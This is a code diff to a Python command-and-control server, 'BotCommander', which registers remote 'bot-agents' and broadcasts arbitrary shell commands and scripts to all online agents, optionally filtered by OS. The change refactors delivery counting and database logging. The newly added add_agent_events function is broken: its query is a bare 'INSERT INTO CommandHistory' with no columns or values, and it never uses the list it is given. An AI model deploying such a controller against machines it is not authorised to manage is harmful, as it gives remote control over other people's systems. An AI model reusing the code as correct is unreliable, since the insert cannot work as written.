@@ -33,8 +33,6 @@ class BotCommander:
     def __init__(self, host, port, offline_tout, cmd_tout):
         self.db = CommanderDatabase()
         self.uuids = {}
-        self.sent = 0
-        self.fail = 0
         self.host = host
         self.port = port
         self.cmd_tout = cmd_tout
@@ -211,7 +209,8 @@ class BotCommander:
                 cmd = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
                 if cmd:
                     await self.__schedule_command("exeCommand", cmd_filter, cmd)
-                    print(f"Command {cmd} was successfully sent to {self.sent} agents and failed to send for {self.fail} agents")
+                    print(f"Command {cmd} was successfully sent to {len(self.success_list)} agents"
+                          f" and failed to send for {len(self.target_list) - len(self.success_list)} agents")
                     msg = "Do you wish to run another command using the same filter? Y/N: "
                     choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
                     match choice:
@@ -228,27 +227,22 @@ class BotCommander:
                     continue
 
     async def __schedule_command(self, command, cmd_filter, *args):
-        self.sent = 0
-        self.fail = 0
         payload = self.__json_builder(command, *args)
-        if cmd_filter:
-            for uuid in self.uuids:
-                if self.uuids[uuid].get("online") and self.uuids[uuid].get("os") == cmd_filter:
-                    await asyncio.wait_for(self.__send_cmd_to_bot_agent(uuid, payload), timeout=60)
-        else:
-            for uuid in self.uuids:
-                if self.uuids[uuid].get("online"):
-                    await asyncio.wait_for(self.__send_cmd_to_bot_agent(uuid, payload), timeout=60)
+        self.target_list = self.db.get_ids_of_online_agents(cmd_filter)
+        self.success_list = []
+        for elem in self.target_list:
+            uuid, = elem
+            await asyncio.wait_for(self.__send_cmd_to_bot_agent(uuid, payload), timeout=60)
+        self.db.add_agent_events(self.success_list)
 
     async def __send_cmd_to_bot_agent(self, uuid, payload):
         try:
             logger.core.debug(f'Sending payload {payload} to bot-agent {self.uuids.get(uuid)}')
             self.uuids[uuid]["writer"].write(payload)
-            self.sent += 1
+            self.success_list.append(uuid)
         except Exception as err:
             logger.core.error(f'Unexpected exception when writing stream {payload.decode("utf-8")} to bot-agent'
                               f' {self.uuids.get(uuid)} - {err}')
-            self.fail += 1
 
     async def __exec_script(self):
         while True:
@@ -289,7 +283,8 @@ class BotCommander:
             with open(path_to_script, 'r') as fh:
                 data = fh.read()
             await self.__schedule_command("exeScript", cmd_filter, data, script_type, path_to_script)
-            print(f"Script {path_to_script} was successfully sent to {self.sent} agents and failed to send for {self.fail} agents")
+            print(f"Script {path_to_script} was successfully sent to {len(self.success_list)} agents and"
+                  f" failed to send for {len(self.target_list) - len(self.success_list)} agents")
             msg = "Do you wish to send another script using the same options? [Y/N] "
             choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
             match choice:
@@ -345,13 +340,15 @@ class BotCommander:
                     else:
                         logger.core.error(f"Processing input stream from bot-agent {addr}-{uuid} has failed. Closing "
                                           f"connection and setting agent to offline")
-                        self.db.set_agent_offline(uuid)
+                        rows = self.db.set_agent_offline(uuid)
+                        logger.core.debug(f"Row count for setting offline {uuid}: {rows}")
                         writer.close()
                         return
             else:
                 logger.core.error(f"EOF received reading input stream from bot-agent {addr}-{uuid}. Closing connection "
                                   f"and setting agent to offline")
-                self.db.set_agent_offline(uuid)
+                rows = self.db.set_agent_offline(uuid)
+                logger.core.debug(f"Row count for setting offline {uuid}: {rows}")
                 writer.close()
                 return
 
@@ -378,13 +375,15 @@ class BotCommander:
                         except Exception as err:
                             logger.core.error(f'Unexpected error when sending botHostInfoReply to bot-agent '
                                               f'{addr}-{agent_uuid}: {err}. Closing connection, set agent to offline.')
-                            self.db.set_agent_offline(agent_uuid)
+                            rows = self.db.set_agent_offline(agent_uuid)
+                            logger.core.debug(f"Row count for setting offline {agent_uuid}: {rows}")
                             return
                         return agent_uuid
                     else:
                         logger.core.error(f"Closing connection of bot-agent {addr}:{agent_uuid} as adding process was"
                                           f" not successfully completed. Closing connection, set agent to offline")
-                        self.db.set_agent_offline(agent_uuid)
+                        rows = self.db.set_agent_offline(agent_uuid)
+                        logger.core.debug(f"Row count for setting offline {agent_uuid}: {rows}")
                         return
                 else:
                     logger.core.error(f"Decoding of getHostInfoReply from peer {addr} has failed, failed to add"
@@ -405,8 +404,8 @@ class BotCommander:
                 uuid = json_msg.get("uuid")
                 if uuid in self.uuids:
                     logger.core.debug(f'Agent {addr} with UUID {uuid} already present in DB.')
-                    self.db.set_agent_online(uuid)
-                    logger.core.debug(f'Agent {addr}-{uuid} is now set to online')
+                    rows = self.db.set_agent_online(uuid)
+                    logger.core.debug(f'Agent {addr}-{uuid} is now set to online. Row count: {rows}')
                     self.uuids[uuid]["reader"] = reader
                     self.uuids[uuid]["writer"] = writer
                     return uuid
@@ -414,8 +413,9 @@ class BotCommander:
                     hostname = json_msg.get("hostname")
                     op_sys = json_msg.get("os")
                     self.uuids[uuid] = {"reader": reader, "writer": writer}
-                    self.db.add_agent(uuid, hostname, addr, 1, op_sys)
+                    rows = self.db.add_agent(uuid, hostname, addr, 1, op_sys)
                     logger.core.info(f"Successfully added agent {hostname}-{uuid} to DB")
+                    logger.core.debug(f"Affected rows by adding agent {hostname}-{uuid} : {rows} row")
                     return uuid
             case "botHello":
                 payload = self.__json_builder("botHelloReply")
@@ -501,7 +501,7 @@ class CommanderDatabase:
             CREATE TABLE IF NOT EXISTS BotAgents
             (id TEXT PRIMARY KEY, hostname TEXT, address TEXT, online INTEGER, os TEXT);
             CREATE TABLE IF NOT EXISTS CommandHistory
-            (id TEXT, time TEXT, command TEXT, FOREIGN KEY (id) REFERENCES BotAgents (id));
+            (id TEXT, time TEXT, event TEXT, event_detail TEXT, response TEXT, FOREIGN KEY (id) REFERENCES BotAgents (id));
             ''')
         return self.query_wrapper("executescript", "CREATE", query)
 
@@ -518,9 +518,16 @@ class CommanderDatabase:
         query = ("UPDATE BotAgents SET online = ? WHERE id = ?", (0, uuid))
         return self.query_wrapper("execute", "UPDATE", query)
 
-    def get_agent_state_and_os(self, uuid):
-        query = ("SELECT online, os FROM BotAgents WHERE id = ?", (uuid,))
+    def get_ids_of_online_agents(self, cmd_filter=""):
+        if cmd_filter:
+            query = ("SELECT id FROM BotAgents WHERE online = ? AND os = ?", (1, cmd_filter))
+        else:
+            query = ("SELECT id FROM BotAgents WHERE online = ?", (1,))
         return self.query_wrapper("execute", "SELECT", query)
+
+    def add_agent_events(self, uuid_list: list):
+        query = ("INSERT INTO CommandHistory")
+        return self.query_wrapper("executemany", "INSERT", query)
 
 
 if __name__ == "__main__":
